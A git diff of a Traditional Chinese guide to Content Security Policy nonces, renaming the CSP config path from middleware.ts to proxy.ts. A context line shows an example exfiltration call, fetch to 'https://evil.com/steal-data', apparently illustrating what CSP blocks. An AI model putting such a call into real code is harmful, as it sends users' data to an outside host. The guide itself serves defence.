@@ -158,7 +158,7 @@ script-src 'self' 'nonce-abc123' 'strict-dynamic';  ✅ 安全！
 
 ### 當前配置
 
-我們的 CSP 配置位於 `apps/frontend/src/middleware.ts`：
+我們的 CSP 配置位於 `apps/frontend/src/proxy.ts`：
 
 ```typescript
 const cspDirectives = [
@@ -286,7 +286,7 @@ fetch('https://evil.com/steal-data', { ... });
 
 ### 1. Middleware 生成 Nonce
 
-**檔案**: `apps/frontend/src/middleware.ts`
+**檔案**: `apps/frontend/src/proxy.ts`
 
 ```typescript
 // 使用 Web Crypto API（Edge Runtime 相容）
